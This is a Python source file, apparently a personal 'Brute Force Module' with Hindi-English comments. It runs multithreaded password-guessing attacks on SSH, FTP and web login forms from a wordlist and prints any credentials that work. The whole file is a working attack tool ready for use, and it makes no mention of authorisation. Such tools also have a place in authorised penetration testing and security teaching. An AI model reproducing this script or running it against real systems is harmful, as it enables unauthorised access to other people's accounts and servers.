import paramiko
from ftplib import FTP, error_perm
import requests
from concurrent.futures import ThreadPoolExecutor
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urljoin

def brute_ssh(ip, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=username, password=password, timeout=3)
        return password 
    except paramiko.AuthenticationException:
        return None
    except Exception as e:
        print(f"[!] SSH Error: {e}")
        return None
    finally:
        client.close()


def brute_ftp(ip, username, password):
    try:
        ftp = FTP(ip)
        ftp.login(user=username, passwd=password)
        ftp.quit()
        return password
    except error_perm:
        return None
    except Exception as e:
        print(f"[!] FTP Error: {e}")
        return None


def brute_http(url, username_field, password_field, username, password):
    #web page login bruteforce ke liye HTTP POST request bhejta hai.
    try:
        session = requests.Session()

        data = {
            username_field: username,
            password_field: password
        }

        # stops redirection
        response = session.post(url, data=data, timeout=5, allow_redirects=False)


        if response.status_code in (301, 302):
            redirect_url = response.headers.get("Location")
            if redirect_url.startswith("/"):
                redirect_url = urljoin(url, redirect_url)
            response = session.get(redirect_url, timeout=5)

        # checking for any hints if success or failure
        soup = BeautifulSoup(response.text, "html.parser")

        # Checks error msges
        flashes = soup.find_all("div", class_="flash")
        for flash in flashes:
            text = flash.get_text(strip=True).lower()
            if "logged in successfully" in text:# Checks error msges
                print(f"[+] HTTP Success: {username}:{password}")
                return f"{username}:{password}\n"
            elif "invalid credentials" in text:
                print(f"[-] HTTP Failed: {username}:{password}")
                return None

        if "dashboard" in response.url:
            print(f"[+] HTTP Success (fallback): {username}:{password}")
            return f"{username}:{password}" # Jugaad se mil gaya!

    except Exception as e:
        print(f"[!] HTTP Error: {e}")
    return None


#multi-threading used here
def threaded_brute(func, args_list, threads=10):
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(func, *args) for args in args_list]
        for f in futures:
            result = f.result()
            if result:
                return result
    return None

#controller
def run_brute(service, ip, username, password_list, http_url=None, u_field="username", p_field="password"):

    if service == "ssh":
        args_list = [(ip, username, pwd) for pwd in password_list]
        result = threaded_brute(brute_ssh, args_list)
    elif service == "ftp":
        args_list = [(ip, username, pwd) for pwd in password_list]
        result = threaded_brute(brute_ftp, args_list)
    elif service == "http" and http_url:
        args_list = [(http_url, u_field, p_field, username, pwd) for pwd in password_list]
        result = threaded_brute(brute_http, args_list)
    else:
        print("[!] Invalid service or missing URL for HTTP")
        return None

    if result:
        print(f"[✓] Brute-force successful: {result}")
    else:
        print("[x] All attempts failed.")
    return result


def main(*args):
    if len(args) < 4:
        print("[!] Not enough arguments.")
        return

    service = args[0]

    if service in ["ssh", "ftp"]:
        ip = args[1]
        username = args[2]
        wordlist_path = args[3]
        try:
            with open(wordlist_path, "r", encoding="latin-1") as f:
                passwords = f.read().splitlines()
        except FileNotFoundError:
            print(f"[!] Wordlist file not found: {wordlist_path}")
            return
        return run_brute(service, ip, username, passwords)

    elif service == "http":
        if len(args) < 6:
            print("[!] Not enough arguments for HTTP. Expected: service url username wordlist u_field p_field")
            return
        url = args[1]
        username = args[2]
        wordlist_path = args[3]
        u_field = args[4]
        p_field = args[5]
        try:
            with open(wordlist_path, "r", encoding="latin-1") as f:
                passwords = f.read().splitlines()
        except FileNotFoundError:
            print(f"[!] Wordlist file not found: {wordlist_path}")
            return
        return run_brute("http", None, username, passwords, http_url=url, u_field=u_field, p_field=p_field)

    else:
        print("[!] Unsupported service")
        return

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute Force Module - Nishith")
    parser.add_argument("--service", required=True, help="ssh / ftp / http")
    parser.add_argument("--ip", help="Target IP (for SSH/FTP)")
    parser.add_argument("--url", help="Target login URL (for HTTP)")
    parser.add_argument("--username", required=True, help="Username to test")
    parser.add_argument("--wordlist", required=True, help="Path to password file")
    parser.add_argument("--u_field", default="username", help="Form field name for username")
    parser.add_argument("--p_field", default="password", help="Form field name for password")

    args = parser.parse_args()

    try:
        with open(args.wordlist, "r", encoding="latin-1") as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print(f"[!] Wordlist file not found: {args.wordlist}")
        exit(1)

    run_brute(
        service=args.service,
        ip=args.ip,
        username=args.username,
        password_list=passwords,
        http_url=args.url,
        u_field=args.u_field,
        p_field=args.p_field
    )